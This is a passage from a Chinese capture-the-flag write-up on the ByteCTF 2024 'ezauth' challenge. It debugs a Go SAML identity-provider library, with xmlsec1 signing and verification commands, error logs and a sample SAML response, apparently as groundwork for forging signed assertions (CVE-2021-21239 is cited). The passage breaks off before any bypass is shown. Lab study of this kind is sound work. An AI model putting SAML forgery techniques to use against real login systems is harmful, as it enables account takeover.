&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">		Assertion: Assertion&#123;</span><br><span class="line">			XMLName: xml.Name&#123;</span><br><span class="line">				Local: &quot;saml:Assertion&quot;,</span><br><span class="line">			&#125;,</span><br><span class="line">			XS:           &quot;http://www.w3.org/2001/XMLSchema&quot;,</span><br><span class="line">			XSI:          &quot;http://www.w3.org/2001/XMLSchema-instance&quot;,</span><br><span class="line">			SAML:         &quot;urn:oasis:names:tc:SAML:2.0:assertion&quot;,</span><br><span class="line">			Version:      &quot;2.0&quot;,</span><br><span class="line">			ID:           util.ID(),</span><br><span class="line">			IssueInstant: time.Now().UTC().Format(time.RFC3339Nano),</span><br><span class="line">			Issuer: Issuer&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Issuer&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Url: &quot;&quot;, // caller must populate ar.AppSettings.AssertionConsumerServiceURL,</span><br><span class="line">			&#125;,</span><br><span class="line">			Subject: Subject&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Subject&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NameID: NameID&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:NameID&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Format:          &quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;,</span><br><span class="line">					Value:           &quot;&quot;,</span><br><span class="line">					SPNameQualifier: &quot;&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				SubjectConfirmation: SubjectConfirmation&#123;</span><br><span class="line">					XMLName: xml.Name&#123;</span><br><span class="line">						Local: &quot;saml:SubjectConfirmation&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">					Method: &quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;,</span><br><span class="line">					SubjectConfirmationData: SubjectConfirmationData&#123;</span><br><span class="line">						XMLName: xml.Name&#123;</span><br><span class="line">							Local: &quot;saml:SubjectConfirmationData&quot;,</span><br><span class="line">						&#125;,</span><br><span class="line">						InResponseTo: &quot;&quot;,</span><br><span class="line">						NotOnOrAfter: time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">						Recipient:    &quot;&quot;,</span><br><span class="line">					&#125;,</span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			Conditions: Conditions&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:Conditions&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				NotBefore:            time.Now().Add(time.Minute * -5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				NotOnOrAfter:         time.Now().Add(time.Minute * 5).UTC().Format(time.RFC3339Nano),</span><br><span class="line">				AudienceRestrictions: []AudienceRestriction&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">			AttributeStatement: AttributeStatement&#123;</span><br><span class="line">				XMLName: xml.Name&#123;</span><br><span class="line">					Local: &quot;saml:AttributeStatement&quot;,</span><br><span class="line">				&#125;,</span><br><span class="line">				Attributes: []Attribute&#123;&#125;,</span><br><span class="line">			&#125;,</span><br><span class="line">		&#125;,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/../imgs/$%7Bfiilename%7D/image-20241111200952916.png" alt="image-20241111200952916"></p>
<p>照着添加（一个个试了试）</p>
<pre><code>    authnResponse.Issuer.SAML = &quot;error&quot;
    authnResponse.Assertion.Issuer.SAML = &quot;error&quot;
</code></pre>
<p>成功解决 ，但是报错2</p>
<h3 id="报错2"><a href="#报错2" class="headerlink" title="报错2"></a>报错2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : func=xmlSecBase64CtxFinal_ex:file=base64.c:line=299:obj=unknown:subj=xmlSecBase64CtxDecodeIsFinished:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecBase64Decode_ex:file=base64.c:line=709:obj=unknown:subj=xmlSecBase64CtxFinal_ex:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyValueX509XmlReadBase64Blob:file=keysdata.c:line=2118:obj=unknown:subj=xmlSecBase64DecodeInPlace:error=1:xmlsec library function failed:node=X509Certificate</span><br><span class="line">func=xmlSecKeyValueX509XmlRead:file=keysdata.c:line=2283:obj=unknown:subj=xmlSecKeyValueX509XmlReadBase64Blob(cert):error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyDataX509XmlRead:file=keysdata.c:line=1908:obj=x509:subj=xmlSecKeyValueX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecOpenSSLKeyDataX509XmlRead:file=x509.c:line=567:obj=x509:subj=xmlSecKeyDataX509XmlRead:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecKeyInfoNodeRead:file=keyinfo.c:line=123:obj=x509:subj=xmlSecKeyDataXmlRead:error=1:xmlsec library function failed:node=X5</span><br></pre></td></tr></table></figure>

<p>用sp的证书试试，也有问题。</p>
<h3 id="跟进签名逻辑看看"><a href="#跟进签名逻辑看看" class="headerlink" title="跟进签名逻辑看看"></a>跟进签名逻辑看看</h3><p><img src="/../imgs/$%7Bfiilename%7D/image-20241111201231381.png" alt="image-20241111201231381"></p>
<p>先生成临时文件，添加xml声明作为首行，调用xmlsec1。这个err是xmlsec1给出的。</p>
<p>只能再换证书。生成新的密钥对：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl req -x509 -newkey rsa:2048 -keyout idp_private_key.pem -out idp_public_key.pem -days 365 -nodes -subj &quot;/C=XX/ST=XX/L=XX/O=XX/CN=XX&quot;</span><br></pre></td></tr></table></figure>

<p>还是异常。</p>
<p>换CVE-2021-21239 Report - Google Docs中的私钥  还是不行。</p>
<p>怀疑是因为没有权限，给证书换个位置，还不行。</p>
<p>迷惑了。</p>
<p>用exec.command执行的语句，给test.xml签名</p>
<p>xmlsec1 –sign –privkey-pem &#x2F;home&#x2F;kali&#x2F;Desktop&#x2F;bytectf2024_ezauth&#x2F;key.pem –id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response –output &#x2F;signed.xml test.xml  </p>
<p>签名成功。说明是idp代码的问题。</p>
<h3 id="改idp"><a href="#改idp" class="headerlink" title="改idp"></a>改idp</h3><p>观察到            </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;samlsig:X509Certificate&gt;stringValueOfCert&lt;/samlsig:X509Certifica</span><br></pre></td></tr></table></figure>

<p>这个项目utils给了加载证书的方法，加载一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b, err := ioutil.ReadFile(&quot;/home/kali/Desktop/bytectf2024_ezauth/cert.pem&quot;)</span><br><span class="line">cert := string(b)</span><br><span class="line"></span><br><span class="line">re := regexp.MustCompile(&quot;---(.*)CERTIFICATE(.*)---&quot;)</span><br><span class="line">cert = re.ReplaceAllString(cert, &quot;&quot;)</span><br><span class="line">cert = strings.Trim(cert, &quot; \n&quot;)</span><br><span class="line">cert = strings.Replace(cert, &quot;\n&quot;, &quot;&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>不报证书错了。</p>
<h3 id="报错3"><a href="#报错3" class="headerlink" title="报错3"></a>报错3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">exit status 1 : C14N error : Relative namespace UR is invalid here : (null)</span><br><span class="line">C14N error : Internal error : checking for relative namespaces</span><br><span class="line">C14N error : Internal error : processing childrens list</span><br><span class="line">C14N error : Internal error : processing docs children list</span><br><span class="line">func=xmlSecTransformC14NExecute:file=c14n.c:line=397:obj=c14n:subj=xmlC14NExecute:error=5:libxml2 library function failed:xml error: 1: Internal error : processing docs children list</span><br><span class="line"></span><br><span class="line">func=xmlSecTransformC14NPushXml:file=c14n.c:line=235:obj=c14n:subj=xmlSecTransformC14NExecute:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformDefaultPushXml:file=transforms.c:line=2118:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxXmlExecute:file=transforms.c:line=1052:obj=enveloped-signature:subj=xmlSecTransformPushXml:error=1:xmlsec library function failed: </span><br><span class="line">func=xmlSecTransformCtxExecute:file=transforms.c:line=1100:obj=unknown:subj=xmlSecTransformCtxXmlExecute:error=1:xmlsec library function fa</span><br></pre></td></tr></table></figure>

<p>不符合规范。。让chatgpt看了一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br></pre></td></tr></table></figure>

<p>改成空就好了。</p>
<p>报错4</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731379479277.png" alt="1731379479277"></p>
<p>SAML块有问题，跟进去看看哪些地方需要修改</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104531547.png" alt="image-20241112104531547"></p>
<p>对着解密base64，跟进，发现解密报错。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112104804430.png" alt="image-20241112104804430"></p>
<p>base字符 “+” 被替换成了 “ “，非常的典型。</p>
<p>加上</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encodedString := url.QueryEscape(b64XML)</span><br><span class="line">encodedString = strings.Replace(encodedString, &quot;+&quot;, &quot;%2B&quot;, -1)</span><br></pre></td></tr></table></figure>

<p>成功进入Validate</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380404419.png" alt="1731380404419"></p>
<p>对解密后的XML树的node值校验。</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110123984.png" alt="image-20241112110123984"></p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110338510.png" alt="image-20241112110338510"></p>
<p>这两布没过，idp代码加上就好了。</p>
<h3 id="报错4"><a href="#报错4" class="headerlink" title="报错4"></a>报错4</h3><p>验证签名失败</p>
<p><img src="/../imgs/$%7Bfiilename%7D/image-20241112110554905.png" alt="image-20241112110554905"></p>
<p>跟进，观察到xmlsec1 verify时候才出的异常</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731380800515.png" alt="1731380800515"></p>
<p>签名和验证阶段的代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">签名</span><br><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output /tmp/tmpgs1729266062 /tmp/tmpgs2471871990</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response /tmp/tmpgs357336979</span><br></pre></td></tr></table></figure>

<p>拷出一份没签名前的消息块idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27; encoding=&#x27;UTF-8&#x27;?&gt;</span><br><span class="line">&lt;samlp:Response xmlns:samlp=&quot;urn:oasis:names:tc:SAML:2.0:protocol&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; xmlns:samlsig=&quot;http://www.w3.org/2000/09/xmldsig#&quot; Destination=&quot;http://localhost:8000/saml_consume&quot; ID=&quot;_ed59d777-c777-46ef-55e3-ab3cebf7d477&quot; Version=&quot;2.0&quot; IssueInstant=&quot;2024-11-12T03:10:59.041732925Z&quot; InResponseTo=&quot;authnRequestIdRespondingTo&quot;&gt;</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">    &lt;samlsig:Signature Id=&quot;_944fac9f-fb10-4e72-61b6-3c8c1928777b&quot;&gt;</span><br><span class="line">        &lt;samlsig:SignedInfo&gt;</span><br><span class="line">            &lt;samlsig:CanonicalizationMethod Algorithm=&quot;http://www.w3.org/2001/10/xml-exc-c14n#&quot;&gt;&lt;/samlsig:CanonicalizationMethod&gt;</span><br><span class="line">            &lt;samlsig:SignatureMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#rsa-sha1&quot;&gt;&lt;/samlsig:SignatureMethod&gt;</span><br><span class="line">            &lt;samlsig:Reference URI=&quot;&quot;&gt;</span><br><span class="line">                &lt;samlsig:Transforms&gt;</span><br><span class="line">                    &lt;samlsig:Transform Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#enveloped-signature&quot;&gt;&lt;/samlsig:Transform&gt;</span><br><span class="line">                &lt;/samlsig:Transforms&gt;</span><br><span class="line">                &lt;samlsig:DigestMethod Algorithm=&quot;http://www.w3.org/2000/09/xmldsig#sha1&quot;&gt;&lt;/samlsig:DigestMethod&gt;</span><br><span class="line">                &lt;samlsig:DigestValue&gt;&lt;/samlsig:DigestValue&gt;</span><br><span class="line">            &lt;/samlsig:Reference&gt;</span><br><span class="line">        &lt;/samlsig:SignedInfo&gt;</span><br><span class="line">        &lt;samlsig:SignatureValue&gt;&lt;/samlsig:SignatureValue&gt;</span><br><span class="line">        &lt;samlsig:KeyInfo&gt;</span><br><span class="line">            &lt;samlsig:X509Data&gt;</span><br><span class="line">                &lt;samlsig:X509Certificate&gt;MIIDazCCAlOgAwIBAgIUexfKkWtRKAWRvcfzl7/MnrZIyQAwDQYJKoZIhvcNAQELBQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUxITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDAeFw0yNDExMTExMjIyNDZaFw0yNzA4MDgxMjIyNDZaMEUxCzAJBgNVBAYTAkFVMRMwEQYDVQQIDApTb21lLVN0YXRlMSEwHwYDVQQKDBhJbnRlcm5ldCBXaWRnaXRzIFB0eSBMdGQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQC2FYuexjL80KhiWeBnTLMCi38g9tho+bhlM0TA3q1ziA5E4oE0pYrHBl1BqxyqtN/Xfb/0CZyry4Hvv/FRpL2C/SsQ7EMJZM3zo4B4iejK4H+jaSNc8T9BWuqnL/d7rpBvB5xA8SrhooM62tGGHOVIaa1ZZP41KS+MQzQudOQsG7rGJa0325EqI8WdsFUvnGgxlWK5M0WyBEtk8kCOVcCx9ONmuDoLsLSDZwwfef5mzuZuvA7A7nvLI90r42MU3g1aopW5pqWPk7mvwh87BGmYzCHz1LN/2mgwC0J8bVx9qM9MLWTkut2GrUgQoxpU7h7XNmReBfdZW+U2lFTr/Ta3AgMBAAGjUzBRMB0GA1UdDgQWBBQNRP2woqWf9nWytFX48shBrWkqIzAfBgNVHSMEGDAWgBQNRP2woqWf9nWytFX48shBrWkqIzAPBgNVHRMBAf8EBTADAQH/MA0GCSqGSIb3DQEBCwUAA4IBAQBpL+lPyfIQoJIqdI/QcNlFX3h6KwJDUk9XwUT6tmOr19mTvQ4FNQMOITLkRAdj1pPDHGq80EUdt+V5dxmSPoAGco4tuzgdHViw5S/TQd3m38Q/oIeJouxC31N8GuLlD8RWzJYMrru+cXVX7nhDKE33pUTfqTWjh7keUMp8wbk1K1fMfkAy+U8XOwYnRnkuNxO2GZwnobrvFhSctJSFzDjOxMfp4F+/STPoUCwFkdYazESGpwfd8n8vFIpTgVNPen7py3xGM6XT8uWl99o5m8lQRBP/wTyqE0lIlaLB8F7OHHjZU4TiuPDm8On1UigrBBSdkTzBjTVJ0e8fdfkceoW7&lt;/samlsig:X509Certificate&gt;</span><br><span class="line">            &lt;/samlsig:X509Data&gt;</span><br><span class="line">        &lt;/samlsig:KeyInfo&gt;</span><br><span class="line">    &lt;/samlsig:Signature&gt;</span><br><span class="line">    &lt;samlp:Status&gt;</span><br><span class="line">        &lt;samlp:StatusCode Value=&quot;urn:oasis:names:tc:SAML:2.0:status:Success&quot;&gt;&lt;/samlp:StatusCode&gt;</span><br><span class="line">    &lt;/samlp:Status&gt;</span><br><span class="line">    &lt;saml:Assertion ID=&quot;_132ebb3f-a299-42c8-5960-f21bed10cce7&quot; Version=&quot;2.0&quot; xmlns:xs=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:saml=&quot;urn:oasis:names:tc:SAML:2.0:assertion&quot; IssueInstant=&quot;2024-11-12T03:10:59.041740369Z&quot;&gt;</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">        &lt;saml:Subject&gt;</span><br><span class="line">            &lt;saml:NameID Format=&quot;urn:oasis:names:tc:SAML:2.0:nameid-format:transient&quot;&gt;userIdThatYouAuthenticated&lt;/saml:NameID&gt;</span><br><span class="line">            &lt;saml:SubjectConfirmation Method=&quot;urn:oasis:names:tc:SAML:2.0:cm:bearer&quot;&gt;</span><br><span class="line">                &lt;saml:SubjectConfirmationData InResponseTo=&quot;authnRequestIdRespondingTo&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.04174105Z&quot; Recipient=&quot;http://localhost:8000/saml_consume&quot;&gt;&lt;/saml:SubjectConfirmationData&gt;</span><br><span class="line">            &lt;/saml:SubjectConfirmation&gt;</span><br><span class="line">        &lt;/saml:Subject&gt;</span><br><span class="line">        &lt;saml:Conditions NotBefore=&quot;2024-11-12T03:05:59.041741731Z&quot; NotOnOrAfter=&quot;2024-11-12T03:15:59.041742162Z&quot;&gt;&lt;/saml:Conditions&gt;</span><br><span class="line">        &lt;saml:AttributeStatement&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;uid&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;userIdThatYouAuthenticated&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">            &lt;saml:Attribute Name=&quot;email&quot; NameFormat=&quot;urn:oasis:names:tc:SAML:2.0:attrname-format:basic&quot;&gt;</span><br><span class="line">                &lt;saml:AttributeValue xsi:type=&quot;xs:string&quot;&gt;someone@domain&lt;/saml:AttributeValue&gt;</span><br><span class="line">            &lt;/saml:Attribute&gt;</span><br><span class="line">        &lt;/saml:AttributeStatement&gt;</span><br><span class="line">    &lt;/saml:Assertion&gt;</span><br><span class="line">&lt;/samlp:Response&gt;                                                                                                                                                                                                                               </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>新开一个终端命令行 用xmlsec1做做测试 让签名后的结果为 signed-idp2sp5.xml</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<h3 id="报错5"><a href="#报错5" class="headerlink" title="报错5"></a>报错5</h3><p>之前没有报错的代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">authnResponse.Issuer.SAML = &quot;&quot;</span><br><span class="line">authnResponse.Assertion.Issuer.SAML = &quot;&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>此时又报错了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">idp2sp5.xml:3: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">    &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                              ^</span><br><span class="line">idp2sp5.xml:27: namespace error : xmlns:saml: Empty XML namespace is not allowed</span><br><span class="line">        &lt;saml:Issuer xmlns:saml=&quot;&quot;&gt;http://localhost:8000/saml&lt;/saml:Issuer&gt;</span><br><span class="line">                                  ^</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                           </span><br></pre></td></tr></table></figure>

<p>但他并不影响signed-idp2sp5.xml的生成</p>
<p>查了一下SAML Response结构里xmlns:saml&#x3D;””是什么。</p>
<p><a target="_blank" rel="noopener" href="https://www.samltool.com/generic_sso_res.php">SAML Response Examples - SAML Assertion Example | SAMLTool.com</a></p>
<p>发现没有也还可以，删掉。</p>
<h3 id="报错6"><a href="#报错6" class="headerlink" title="报错6"></a>报错6</h3><p>删掉后去签名验证，验证失败</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/frntn-x509-san.crt --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLEvpSignatureVerify:file=evp_signatures.c:line=453:obj=rsa-sha1:subj=unknown:error=18:data do not match:details=EVP_VerifyFinal: signature verification failed</span><br><span class="line">FAIL</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line">Error: failed to verify file &quot;signed-idp2sp5.xml&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里不确定说的是哪个证书(公钥)有问题，我们先用一组对称的密钥来签名验证。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br></pre></td></tr></table></figure>

<p>显示用对称密钥加解密就能成功。显然是xml中的证书的格式不对，没起到作用（因为我们在xml中放的就是cert.pem）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --sign --privkey-pem /home/kali/Desktop/bytectf2024_ezauth/key.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response --output signed-idp2sp5.xml idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">                                                                                                                                                                                                                               </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop/bytectf2024_ezauth]</span><br><span class="line">└─# xmlsec1 --verify --pubkey-cert-pem /home/kali/Desktop/bytectf2024_ezauth/cert.pem --id-attr:ID urn:oasis:names:tc:SAML:2.0:protocol:Response signed-idp2sp5.xml</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=389:obj=x509-store:subj=unknown:error=71:certificate verification failed:X509_verify_cert: subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">func=xmlSecOpenSSLX509StoreVerify:file=x509vfy.c:line=432:obj=x509-store:subj=unknown:error=71:certificate verification failed:subject=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; issuer=/C=AU/ST=Some-State/O=Internet Widgits Pty Ltd; err=18; msg=self-signed certificate</span><br><span class="line">OK</span><br><span class="line">SignedInfo References (ok/all): 1/1</span><br><span class="line">Manifests References (ok/all): 0/0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>找一个文档示例代码看看</p>
<p><img src="/../imgs/$%7Bfiilename%7D/1731382498145.png" alt="1731382498145"></p>
<p>用这个代码去xmlsec1验证，同样失败。</p>
<p>翻规范手册</p>
<blockquote>
<p><code>KeyInfo</code> 是一个可选元素，它使收件人能够获取验证签名所需的密钥。<a target="_blank" rel="noopener" href="https://www.w3.org/TR/xmldsig-core/#sec-X509Data">XML 签名语法和处理版本 1.1 — XML Signature Syntax and Processing Version 1.1</a></p>
</blockquote>
<p>pysaml2中提供的示范代码，将RSA key 提供在了以下地方</p>
